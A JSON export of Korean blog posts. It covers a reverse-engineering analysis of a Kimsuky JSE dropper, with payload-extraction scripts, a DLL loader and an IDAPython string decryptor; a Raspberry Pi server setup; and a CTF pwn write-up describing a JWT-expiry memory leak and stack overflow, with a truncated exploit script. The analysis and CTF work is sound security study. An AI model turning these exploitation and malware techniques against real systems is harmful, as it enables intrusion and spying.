[{"content":"Overview 북한 Kimsuky 위협 그룹에서 외교부를 타겟으로 악성코드를 유포했다.\nAnalysis Procmon 외교부가판2021-05-07로 유포되었고, .pdf.jse의 형태를 취하고 있었다. vm안에서 실행하고 process create로 필터링해서 확인해보면, WScript.exe가 돌면서 프로세스를 생성한다.\ndll를 regsvr32.exe로 등록한다. 그냥 pdf viewer처럼 동작하면서 외교부가판 문서를 열어준다. 하지만 procmon으로 확인해보면 process create를 걸고 확인해보면 실제로는 WScript가 실행되면서 실제 악성코드를 드랍한다. regsvr32.exe로 악성 dll을 로드하고 실행 흐름이 넘어간다. 이러한 형태는 백신을 우회하기 위해 사용된다.\nDll Extraction pdf를 열어주고 뒤에선 base64 더블 디코딩을 수행하고 실행흐름을 dll로 프록시한다.\nwith open(\u0026#39;./1.jse\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x2000000) st = buf[(buf.find(b\u0026#39;d6rdVIu1CNC = \u0026#34;\u0026#39;)):] st = (st[st.find(b\u0026#39;\u0026#34;\u0026#39;)+1:]) dropped = st[:st.find(b\u0026#39;\u0026#34;\u0026#39;)] with open(\u0026#39;./dropped_base\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dropped) with open(\u0026#39;./dropped_base\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x20000000) import base64 dec = (base64.decodebytes(buf)) with open(\u0026#39;./dropped\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dec) # dropped pdf with open(\u0026#39;./1.jse\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x2000000) st = buf[(buf.find(b\u0026#39;tbPaitkT4N4 =\u0026#39;)):] st = (st[st.find(b\u0026#39;\u0026#34;\u0026#39;)+1:]) dropped = st[:st.find(b\u0026#39;\u0026#34;\u0026#39;)] with open(\u0026#39;./dropped_dll_base\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dropped) with open(\u0026#39;./dropped_dll_base\u0026#39;,\u0026#39;rb\u0026#39;) as f: buf = f.read(0x200000000) dec = base64.decodebytes((base64.decodebytes(buf))) with open(\u0026#39;./dropped_dll.dll\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(dec) # dropped pdf 분석한대로 추출하면 악성 dll과 pdf를 얻을 수 있다.\nReverse engineering regsvr32.exe 처음에 실행흐름을 프록시하기 위해서 regsvr32.exe를 호출했다. 악성 dll 분석 이전에 regsvr32.exe에서 어떤 함수를 호출하는지 확인했다. DllRegisterServer 문자열을을 로드한다.\n메인 부분이다. 실질적으로 DllRegisterServer를 호출한다.\ndropped_dll.dll 분석하다보면 다음과 같은 패턴이 보인다.\nobj[2] = 0i64; obj[3] = 7i64; LOWORD(obj[0]) = 0; sub_7FFF20E781A0(obj, L\u0026#34;651a77c90efb857ab62008a5a730e362365c52c9a23ec8c4001329a13434e5b6e3cc8b774885327ffaef\u0026#34;, 84ui64); v1 = sub_7FFF20E8B330(obj, v30); sub_7FFF20E781A0는 문자열을 할당한다. 실질적으로 실행되는 로직은 아래와 같다. 최종적으로 다음과 같은 구조를 가지게된다. 넘겨지는 size 별로 처리가 다르다. size가 7 이하라면, a[0], a[1] 영역에 바로 문자열을 쓴다. 더 크다면 아래와 같은 구조로 할당한다.\na[0] = str_mem ... a[2] = sz 이후 sub_7FFF20E8B330을 호출한다.\n실질적으로 여기서 디코딩을 수행한다. 처음에 0x10개의 wchar_t를 읽고 rot_hex에 저장한다. 문자열 size가 8 이상이면, *obj를 문자열로 참조한다. 루프를 돌면서 hex_rot[iterator%0x10]^ *obj[iter_] ^ dec_16을 한다. dec_16은 전에 참조한 hex가 들어간다.\nloader.cpp #include \u0026lt;iostream\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;cstdint\u0026gt; #include \u0026lt;stdio.h\u0026gt; void hexdump(void *ptr, int buflen) { unsigned char *buf = (unsigned char*)ptr; int i, j; for (i=0; i\u0026lt;buflen; i+=16) { printf(\u0026#34;%06x: \u0026#34;, i); for (j=0; j\u0026lt;16; j++) if (i+j \u0026lt; buflen) printf(\u0026#34;%02x \u0026#34;, buf[i+j]); else printf(\u0026#34; \u0026#34;); printf(\u0026#34; \u0026#34;); for (j=0; j\u0026lt;16; j++) if (i+j \u0026lt; buflen) printf(\u0026#34;%c\u0026#34;, isprint(buf[i+j]) ? buf[i+j] : \u0026#39;.\u0026#39;); printf(\u0026#34;\\n\u0026#34;); } } int main() { const char* libraryPath = \u0026#34;.\\\\dropped_dll.dll\u0026#34;; HINSTANCE hDLL = LoadLibraryA(libraryPath); if (hDLL == NULL) { DWORD error = GetLastError(); std::cerr \u0026lt;\u0026lt; \u0026#34;failed to load dll. Error code: \u0026#34; \u0026lt;\u0026lt; error \u0026lt;\u0026lt; std::endl; return 1; } const char* functionName = \u0026#34;DllRegisterServer\u0026#34;; typedef int64_t * (*f_type)(int64_t * a, int64_t * b); typedef int64_t * (*f_type1)(int64_t * a, wchar_t * src, int64_t sz); uint64_t v = reinterpret_cast\u0026lt;uint64_t\u0026gt;(GetProcAddress(hDLL, functionName)); if (v == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;failed to get the function.\u0026#34; \u0026lt;\u0026lt; std::endl; FreeLibrary(hDLL); return 1; } uint64_t t = v - (0x7FFBE99D8CA0-0x7FFBE99CB330); uint64_t t1 = v - (0x7FFBE99D8CA0-0x07FFBE99B81A0); std::cout \u0026lt;\u0026lt; \u0026#34;DllRegisterServer addr: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; v \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;enc addr: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; t \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;prep addr: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; t1 \u0026lt;\u0026lt; std::endl \u0026lt;\u0026lt; std::endl; f_type dec = reinterpret_cast\u0026lt;f_type\u0026gt;(t); f_type1 prep = reinterpret_cast\u0026lt;f_type1\u0026gt;(t1); int64_t a[4]; a[1] = 0; a[2] = 0; a[3] = 7; int64_t * ret = prep(a,L\u0026#34;651a77c90efb857ab62008a5a730e362365c52c9a23ec8c4001329a13434e5b6e3cc8b774885327ffaef\u0026#34;, 84); std::cout \u0026lt;\u0026lt; \u0026#34;ret[0] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[0] \u0026lt;\u0026lt; \u0026#34; -\u0026gt; \u0026#34;; std::wcout \u0026lt;\u0026lt; (wchar_t *)ret[0] \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;ret[1] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[1] \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;ret[2] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[2] \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026#34;ret[3] = \u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; ret[3] \u0026lt;\u0026lt; std::endl; int64_t b[4]; int x; std::cin \u0026gt;\u0026gt; x; int64_t * ret1 = dec(a,b); std::wcout \u0026lt;\u0026lt; (wchar_t *)ret1[0] \u0026lt;\u0026lt; std::endl; FreeLibrary(hDLL); return 0; } 분석할때 문자열 decryption을 쉽게하려고 위와 같은 dll로더를 작성했다. 근데 생각보다 저런 패턴의 hex 문자열들이 너무 많아서 하나씩 돌리기엔 무리인것 같아서 idapython을 작성했다.\ndecrypt.py def dec(v): rot_hex = [] out = \u0026#39;\u0026#39; for i in range(16): rot_hex.append(int(v[i*2:i*2+2],16)) x = 0 for i in range((len(v)-32)//2): hex_ = int(v[i*2+0x20: i*2+0x22],16) res = rot_hex[i%0x10] ^ x ^ hex_ out += chr(res) x = hex_ return out def is_hex(v): f = 1 for i in range(len(v)): if v[i] not in \u0026#39;0123456789abcdef\u0026#39;: f = 0 break return f from idautils import * import idaapi, ida_ua, idc def comment(ea,comment): cfunc = idaapi.decompile(ea) tl = idaapi.treeloc_t() tl.ea = ea tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, comment) cfunc.save_user_cmts() target = 0x07FFF20E781A0 for xref in XrefsTo(target, 0): args = idaapi.get_arg_addrs(xref.frm) if args: insn = ida_ua.insn_t() ida_ua.decode_insn(insn, args[1]) if insn.itype == 0x5c: wstr = idc.get_operand_value(insn.ea,1) t = idc.get_operand_type(insn.ea,1) if t == 2: sz = idc.get_operand_value(args[2],1) if sz == 0 or idc.get_operand_type(args[2],1) == 1: # r8d == 0 continue if sz \u0026gt; 0x20 and sz \u0026amp; 1 == 0: continue v = ida_bytes.get_bytes(wstr, sz*2) estr = \u0026#39;\u0026#39; for i in range(sz): estr += chr(v[2*i]) if is_hex(estr): comment(xref.frm, dec(estr)) print(\u0026#34;done\u0026#34;) 적용시키면 다음과 같이 주석으로 decrypt시 string을 보여준다. Behavior 대부분의 중요한 API들은 string decryption이후 런타임에 동적으로 호출된다 ESTCommon.dll을 준비하고, 문자열을 연결한다. 이후 data에 이 스트링을 넣는다.\n레지스트리키를 등록한다. 이렇게 등록해놓고나서 KeyboardMonitor, ScreenMonitor, FolderMonitor, UsbMonitor 플래그를 쓴다. 특정 파일에 a로 쓰는것을 확인할 수 있다.\n뮤텍스를 생성해서 중복 실행을 방지한다. 마지막으로 여러 쓰레드를 생성한다.\nInput Capture log.txt에 저장하는것으로 보인다. v2를 0~255까지 순회시키면서 입력을 캡쳐한다.\nScreen Capture 계속 루프를 돈다. capture 함수에서 캡쳐하고 비트맵으로 저장한다. Collect media files Desktop, Downloads, Documents, INetCache\\IE 같은곳을 돈다. 파일을 찾아서 저장한다.\nCollect removable media files 이런식으로 A부터 다 돌려보는식으로 체크한다. ","permalink":"https://msh1307.kr/blog/jse_dropper_kimsuky/","summary":"Overview 북한 Kimsuky 위협 그룹에서 외교부를 타겟으로 악성코드를 유포했다.\nAnalysis Procmon 외교부가판2021-05-07로 유포되었고, .pdf.jse의 형태를 취하고 있었다. vm안에서 실행하고 process create로 필터링해서 확인해보면, WScript.exe가 돌면서 프로세스를 생성한다.\ndll를 regsvr32.exe로 등록한다. 그냥 pdf viewer처럼 동작하면서 외교부가판 문서를 열어준다. 하지만 procmon으로 확인해보면 process create를 걸고 확인해보면 실제로는 WScript가 실행되면서 실제 악성코드를 드랍한다. regsvr32.exe로 악성 dll을 로드하고 실행 흐름이 넘어간다. 이러한 형태는 백신을 우회하기 위해 사용된다.\nDll Extraction pdf를 열어주고 뒤에선 base64 더블 디코딩을 수행하고 실행흐름을 dll로 프록시한다.","title":"Kimsuky malware analysis"},{"content":"setup raspi-img \u0026amp; switch 평소에 포트포워딩해서 개인 nas겸 CTF시 request bin 같은걸로 잘 쓰고 있었는데, 본딩을 설정하다가 서버가 죽어버렸다. 라즈베리파이 5도 구매해서 4랑 같이 처음부터 밀고 다시 세팅했다. 기존에 WiFi로만 동작하던 서버를 이더넷이 끊켰을때만 WiFi를 사용하도록 바꿨다. cat.5e 랜선을 연결하고 1Gbps를 지원하는 스위칭 허브를 구매하여 연결했다.\n라즈베리파이 pcie 인터페이스에 WD SN770을 연결했는데 제대로 동작하지 않았다. 중국산 500기가 ssd 연결하니 잘 동작해서 usb3.0으로 연결했다. network interface #!/bin/bash if [ -z \u0026#34;$1\u0026#34; ]; then DELAY=\u0026#34;30\u0026#34; else DELAY=\u0026#34;$1\u0026#34; fi sleep $DELAY EthAddr=$(ip addr show eth0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) WiFiAddr=$(ip addr show wlan0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) if [ -z $EthAddr ]; then echo \u0026#34;Using WiFi\u0026#34; echo \u0026#34;wlan0 IP=$WiFiAddr\u0026#34; else echo \u0026#34;Using Ethernet! Switching off WiFi\u0026#34; echo \u0026#34;eth0 IP=$EthAddr\u0026#34; echo \u0026#34;wlan0 IP=$WiFiAddr\u0026#34; ifconfig wlan0 down fi 이렇게 작성해준다.\n#!/bin/sh -e # # rc.local # # This script is executed at the end of each multiuser runlevel. # Make sure that the script will \u0026#34;exit 0\u0026#34; on success or any other # value on error. # # In order to enable or disable this script just change the execution # bits. # # By default this script does nothing. /home/msh/check_eth.sh \u0026amp; # Print the IP address _IP=$(hostname -I) || true if [ \u0026#34;$_IP\u0026#34; ]; then printf \u0026#34;My IP address is %s\\n\u0026#34; \u0026#34;$_IP\u0026#34; fi exit 0 그리고 /etc/rc.local에 등록해주면, 랜선이 꼽혀있는한 eth0 인터페이스만 활성화된다.\nauto reboot \u0026amp; fail2ban 00 00 * * * reboot crontab -e로 넣어준다.\n그리고 sudo apt install fail2ban 해주고\n[DEFAULT] findtime = 1d maxretry = 8 bantime = 3w`` backend = systemd ignoreip = 127.0.0.1/8 192.168.0.0/24 [sshd] enabled = true port = 22 filter = sshd logpath = /var/log/fail2ban-ssh.log /etc/fail2ban/jail.local을 세팅해준다.\nPort fowarding 인터페이스 두개 MAC으로 dhcp ip를 고정시켜준다. 그리고 포트 열어주면 된다.\nCloudflare 그리고 이제 네임서버 바꿔주고 A 레코드 DNS only로 서브도메인도 설정해줬다. 하나는 블로그라 깃허브로 연결되어있고, 서브도메인을 따로 두고 직접 라즈베리파이 서버로 들어가도록 했다.\nSSL \u0026amp; Proxy 개인 nas처럼 쓰려는데 ssl을 자체적으로 지원은 안하는것 같아서 nginx로 프록시해서 ssl을 적용시켰다. 그리고 라즈베리파이4에서 리버스프록시로 라즈베리파이5로도 포워딩하도록 설정했다.\nsudo certbot 이후 서브도메인으로 주면 알아서 설정해준다. /etc/nginx/sites-enabled/* 를 수정해준다.\nserver_name raspi.msh1307.kr; # managed by Certbot location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://127.0.0.1:8080/; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. #try_files $uri $uri/ =404; } certbot이 자동으로 생성한 부분 조금 지워주고 수정해서 루프백으로 포워딩해주는 부분을 추가한다. 그리고 라즈베리파이5로도 포워딩이 진행되어야하니 설정을 그대로 복사해서 listen만 다른 포트로 지정해주면 된다.\nsudo nginx -t sudo service nginx restart 그리고 crontab에 넣어서 자동으로 인증서를 갱신하게 해줄 수 있다.\n00 02 * * 0 sudo certbot renew --quiet ","permalink":"https://msh1307.kr/blog/raspberry_pi_setup/","summary":"setup raspi-img \u0026amp; switch 평소에 포트포워딩해서 개인 nas겸 CTF시 request bin 같은걸로 잘 쓰고 있었는데, 본딩을 설정하다가 서버가 죽어버렸다. 라즈베리파이 5도 구매해서 4랑 같이 처음부터 밀고 다시 세팅했다. 기존에 WiFi로만 동작하던 서버를 이더넷이 끊켰을때만 WiFi를 사용하도록 바꿨다. cat.5e 랜선을 연결하고 1Gbps를 지원하는 스위칭 허브를 구매하여 연결했다.\n라즈베리파이 pcie 인터페이스에 WD SN770을 연결했는데 제대로 동작하지 않았다. 중국산 500기가 ssd 연결하니 잘 동작해서 usb3.0으로 연결했다. network interface #!/bin/bash if [ -z \u0026#34;$1\u0026#34; ]; then DELAY=\u0026#34;30\u0026#34; else DELAY=\u0026#34;$1\u0026#34; fi sleep $DELAY EthAddr=$(ip addr show eth0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) WiFiAddr=$(ip addr show wlan0 | grep \u0026#34;inet\\b\u0026#34; | awk \u0026#39;{print $2}\u0026#39; | cut -d/ -f1) if [ -z $EthAddr ]; then echo \u0026#34;Using WiFi\u0026#34; echo \u0026#34;wlan0 IP=$WiFiAddr\u0026#34; else echo \u0026#34;Using Ethernet!","title":"Raspberry pi server setup"},{"content":"개인전으로 2위를 했다. 2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.\nsonofthec 인터넷 검색을 통해 enum을 복구한다. methods_fn[0] = (__int64)exit_with_code; methods_fn[1] = (__int64)register; methods_fn[2] = (__int64)login; methods_fn[3] = (__int64)token_status; methods_fn[4] = (__int64)update; methods_fn[5] = (__int64)logout; result = upload; methods_fn[6] = (__int64)upload; json으로 입력을 받고 그에 따른 핸들러를 호출한다.\nread_secret(); args = json_object_object_get(json_obj, \u0026#34;args\u0026#34;); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;username\u0026#34;); chk_string((__int64)STR); object.username = json_object_get_string(STR); usr_name_len = strlen((const char *)object.username); if ( usr_name_len \u0026gt; 0x10 ) exit(0); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;email\u0026#34;); chk_string((__int64)STR); object.email = json_object_get_string(STR); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;Car\u0026#34;); chk_string((__int64)STR); object.Car = json_object_get_string(STR); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;VIN\u0026#34;); chk_string((__int64)STR); object.Vin = json_object_get_string(STR); std::allocator\u0026lt;char\u0026gt;::allocator(vin); new_string(vin_1, (char *)object.Vin); std::allocator\u0026lt;char\u0026gt;::~allocator(); std::string::basic_string((__int64)str, (__int64)vin_1); check_string_length((__int64)str); std::string::~string(str); STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, \u0026#34;Company\u0026#34;); chk_string((__int64)STR); object.Company = json_object_get_string(STR); v18 = std::chrono::_V2::system_clock::now(STR); initialize( // memleak. 0x10 sz username. (const char *)object.username, (const char *)object.email, (const char *)object.Car, (const char *)object.Vin, (const char *)object.Company); initialize_object(vin); std::allocator\u0026lt;char\u0026gt;::allocator(v15); new_string(dreamhack_string, \u0026#34;Dreamhack\u0026#34;); v3 = setting_iss((__int64)vin, (__int64)dreamhack_string); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[1]); new_string(v33, \u0026#34;JWT\u0026#34;); v4 = setting_typ(v3, (__int64)v33); *(_DWORD *)\u0026amp;v16[8] = 30; sub_115E4(v19, (int *)\u0026amp;v16[8]); v20 = sub_11607((__int64)\u0026amp;v18, (__int64)v19); v5 = setting_exp(v4, (__int64)\u0026amp;v20); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[2]); new_string(usrname, (char *)object.username); set_data(\u0026amp;data, (__int64)usrname); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[3]); // allocator doesnt do anything. just a dummy function new_string(username_string, \u0026#34;username\u0026#34;); v6 = sub_117B0(v5, (__int64)username_string, \u0026amp;data);// v31+8 -\u0026gt; string_ptr std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v15[4]); new_string(a1, (char *)object.email); if ( username ) { v5 = strlen(username); strncpy((char *)ptr, username, v5); } if ( email ) { l = strlen(email); v7 = ptr; v7-\u0026gt;email = (__int64)malloc(l + 1); strcpy((char *)ptr-\u0026gt;email, email); } if ( car ) { l_1 = strlen(car); v9 = ptr; v9-\u0026gt;car = (__int64)malloc(l_1 + 1); strcpy((char *)ptr-\u0026gt;car, car); } if ( vin ) { v10 = strlen(vin); v11 = ptr; v11-\u0026gt;vin = (__int64)malloc(v10 + 1); strcpy((char *)ptr-\u0026gt;vin, vin); } if ( company ) 다음과 같이 여러 필드를 받으며, 이에 따라 JWT 토큰을 발급한다. initialize 함수에서 0x10 size로 검증한다. null terminated가 제대로 이루어지지 않을 수 있다. ptr에 저장된 객체가 참조되며 프린트된다면, memory leak이 발생할 수 있다. Hex-rays 상에선 보이지 않지만, graph view에선 실제로는 c++의 code level exception의 핸들러들도 구현이 되어있다. 만약 exception이 raise되면, exception에 따라 stack unwinding 등의 작업을 수행한다. v3 = json_object_object_get(obj, \u0026#34;args\u0026#34;); v4 = json_object_object_get(v3, \u0026#34;token\u0026#34;); chk_string(v4); if ( !v4 ) exit(-1); token = (char *)json_object_get_string(v4); if ( !token ) exit(-1); std::allocator\u0026lt;char\u0026gt;::allocator((char *)\u0026amp;v2 + 3); new_string(tok, token); std::allocator\u0026lt;char\u0026gt;::~allocator(); std::string::operator=(\u0026amp;current_token, tok); sub_F323((__int64)v7, (__int64)tok); sub_F40E((__int64)v8, (__int64)v7); verify((__int64)v8); // exception can be thrown here sub_F27A((__int64)v8); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Login success\\n\u0026#34;); sub_F27A((__int64)v7); std::string::~string(tok); return 0LL; jwt token을 입력으로 받아서 로그인을 수행한다.\nstd::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v6); new_string(v12, \u0026#34;Dreamhack\u0026#34;); v2 = sub_11DCE(v1, (__int64)v12); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v7); new_string(v13, \u0026#34;Dreamhack\u0026#34;); set_data(\u0026amp;v9, (__int64)v13); std::allocator\u0026lt;char\u0026gt;::allocator(v8); new_string(v14, \u0026#34;Company\u0026#34;); v3 = sub_11F76(v2, (__int64)v14, (__int64)\u0026amp;v9); verify_0(v3, rdi0); std::string::~string(v14); std::allocator\u0026lt;char\u0026gt;::~allocator(v8); sub_F350(\u0026amp;v9); std::string::~string(v13); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v7); std::string::~string(v12); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v6); sub_F370((__int64)v15); std::string::~string(a1); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); sub_F10A((__int64)v10); priv_flag = 1; // if Exception Thrown, priv_flag = 0 return v16 - __readfsqword(0x28u); } verify 함수에서 priv_flag가 1이 되면 로그인에 성공하게 된다. 이때 JWT 토큰의 Company가 Dreamhack인지를 검증하게 되며, 아니라면 exception이 raise된다.\nv5 = __readfsqword(0x28u); sub_9E62((std::_V2 *)\u0026amp;v3); sub_15EDC(a1, a2, (std::_V2 *)\u0026amp;v3); sub_E470(v3, v4); return v5 - __readfsqword(0x28u); } result = sub_9FB6(\u0026amp;v18); if ( (_BYTE)result ) { v3 = sub_CF54(); v4 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v4, v3) ) { exception = __cxa_allocate_exception(0x20uLL); sub_E2FE(exception, (unsigned int)v18, v19); __cxa_throw(exception, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::rsa_exception, sub_26EFC); } v6 = sub_D346(); v7 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v7, v6) ) { v8 = __cxa_allocate_exception(0x20uLL); sub_E348(v8, (unsigned int)v18, v19); __cxa_throw(v8, (struct type_info *)\u0026amp;`typeinfo for\u0026#39;jwt::error::ecdsa_exception, sub_26E9E); } v9 = sub_D78D(); v10 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v10, v9) ) { v11 = __cxa_allocate_exception(0x20uLL); sub_E392(v11, (unsigned int)v18, v19); __cxa_throw(v11, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::signature_verification_exception, sub_26FB8); } v12 = sub_DE33(); v13 = sub_9F24(\u0026amp;v18); if ( (unsigned __int8)sub_9E44(v13, v12) ) { v14 = __cxa_allocate_exception(0x20uLL); sub_E3DC(v14, (unsigned int)v18, v19); __cxa_throw(v14, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::signature_generation_exception, sub_26F5A); } v15 = sub_E231(); v16 = sub_9F24(\u0026amp;v18); result = sub_9E44(v16, v15); if ( (_BYTE)result ) { v17 = __cxa_allocate_exception(0x20uLL); sub_E426(v17, (unsigned int)v18, v19); __cxa_throw(v17, (struct type_info *)\u0026amp;typeinfo for\u0026#39;jwt::error::token_verification_exception, sub_26E40); } } return result; } 이때도 hex-rays 상에 보이지 않는 핸들러가 존재한다. 이때 priv_flag에 0이 대입된다. token status에서 jwt 토큰을 받고, 그 토큰에 대한 정보를 출력한다.\nnew_string(v15, \u0026#34;Company\u0026#34;); v2 = sub_11F76(v1, (__int64)v15, \u0026amp;v10); verify_0(v2, (__int64)v17); std::string::~string(v15); std::allocator\u0026lt;char\u0026gt;::~allocator(); sub_F350(\u0026amp;v10); std::string::~string(v14); std::allocator\u0026lt;char\u0026gt;::~allocator(); std::string::~string(v13); std::allocator\u0026lt;char\u0026gt;::~allocator(); sub_F370((__int64)v16); std::string::~string(a1); std::allocator\u0026lt;char\u0026gt;::~allocator(); sub_F10A((__int64)v11); sub_120B8(v11, v17); v8 = v11; *(_QWORD *)\u0026amp;v7[3] = sub_12184((__int64)v11); *(_QWORD *)\u0026amp;v10.type = sub_121A2(v8); while ( !sub_121C0(\u0026amp;v7[3], \u0026amp;v10) ) { v9 = (char *)sub_12208(\u0026amp;v7[3]); v3 = std::operator\u0026lt;\u0026lt;\u0026lt;char\u0026gt;(\u0026amp;std::cout, v9); v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v3, \u0026#34; = \u0026#34;); v5 = sub_1222D(v4, (data *)v9 + 2); std::ostream::operator\u0026lt;\u0026lt;(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); sub_121E6((__int64)\u0026amp;v7[3]); } sub_F608((__int64)v11); sub_F27A((__int64)v17); 이때 문제는 memory leak은 파싱된 jwt의 body를 기준으로 출력하며, 내부적으로 key, value 형태의 오브젝트로 구현된다. register시에 initialize되어 null terminated string이 아니라, 파싱된 스트링을 jwt 토큰 제작에 이용하므로 memory leak이 절대 불가능하다. 하지만 Exception이 발생했을때 복구 로직에 구현 오류가 존재한다. exception 복구 로직은 진한 초록색으로 하이라이팅되어있는 부분이다. 이때 ptr이 참조되면서 복구 로직이 수행된다. 구현이 가용성에 초점이 맞춰져있어서 exception이 thrown되어도 정상처리를 가능케 해준다. 이를 악용하기 위해서는 JWT 토큰을 검증 시각에 invalidate하게 만들 필요가 있다.\nclock = std::chrono::_V2::system_clock::now(STR); ... new_string(v33, \u0026#34;JWT\u0026#34;); v4 = setting_typ(v3, (__int64)v33); *(_DWORD *)\u0026amp;v16[8] = 30; sub_115E4(v19, (int *)\u0026amp;v16[8]); v20 = sub_11607((__int64)\u0026amp;clock, (__int64)v19); v5 = setting_exp(v4, (__int64)\u0026amp;v20); v4 = *a1; v2 = ret_a1_1(\u0026amp;v4); copy_obj(v5, a2); v6 = v2 + ret_a1_1(v5); set_result(v7, \u0026amp;v6); return v7[0]; 마침 expire time이 30초이므로 그 시간을 sleep하고 token을 검증하면 invalidate 시킬 수 있고, 복구 로직에 의해서 memory가 leak된다.\nv5 = json_object_object_get(a1, \u0026#34;args\u0026#34;); v6 = json_object_object_get(v5, \u0026#34;idx\u0026#34;); if ( !v6 ) exit(-1); data = json_object_object_get(v5, \u0026#34;data\u0026#34;); v3 = ((__int64 (__fastcall *)(__int64))json_object_array_length)(v6); data_len = ((__int64 (__fastcall *)(__int64))json_object_array_length)(data); if ( v3 \u0026gt; 0x10 ) exit(-1); for ( i = 0; data_len \u0026gt; i; ++i ) { idx = json_object_array_get_idx(data, (int)i); if ( (unsigned int)((__int64 (__fastcall *)())json_object_get_type)() == json_type_int ) v9[i] = json_object_get_int64(idx); } bof가 있으니 rip control도 가능하다. canary는 int가 아닐때 write가 안되니 우회할 수 있다.\nExploit from pwn import * import json sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) sl = lambda x : p.sendline(x) rvl = lambda : p.recvline() def dump(object): ret = b\u0026#39;{\u0026#39; l = len(object.keys()) i = 0 for it in object.keys(): if isinstance(object[it],dict): ret += b\u0026#39;\u0026#34;\u0026#39; if isinstance(it, bytes): ret += it elif isinstance(it, str): ret += it.encode() else: raise Exception(\u0026#39;unsupported type\u0026#39;) ret += b\u0026#39;\u0026#34; : \u0026#39; ret += dump(object[it]) elif isinstance(object[it],bytes) or isinstance(object[it],str): ret += b\u0026#39;\u0026#34;\u0026#39; if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception(\u0026#39;unsupported type\u0026#39;) ret += b\u0026#39;\u0026#34; : \u0026#34;\u0026#39; if isinstance(object[it],bytes): ret += object[it] else: ret += object[it].encode() ret += b\u0026#39;\u0026#34;\u0026#39; elif isinstance(object[it],int): ret += b\u0026#39;\u0026#34;\u0026#39; if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception(\u0026#39;unsupported type\u0026#39;) ret += b\u0026#39;\u0026#34; : \u0026#34;\u0026#39; + str(object[it]).encode() + b\u0026#39;\u0026#34;\u0026#39; elif isinstance(object[it],list): ret += b\u0026#39;\u0026#34;\u0026#39; if not isinstance(it, bytes): ret += it.encode() elif isinstance(it, str): ret += it else: raise Exception(\u0026#39;unsupported type\u0026#39;) val = b\u0026#39;[\u0026#39; for k in object[it]: if isinstance(k, int): val += str(k).encode() + b\u0026#39;,\u0026#39; elif isinstance(k, str): val += b\u0026#39;\u0026#34;\u0026#39; + k.encode() + b\u0026#39;\u0026#34;,\u0026#39; else: raise Exception(\u0026#39;unsupported type\u0026#39;) val = val[:-1] val += b\u0026#39;]\u0026#39; ret += b\u0026#39;\u0026#34; : \u0026#39; + val else: raise Exception(\u0026#39;unsupported type\u0026#39;) i += 1 if i != l: ret += b\u0026#39;,\u0026#39; ret += 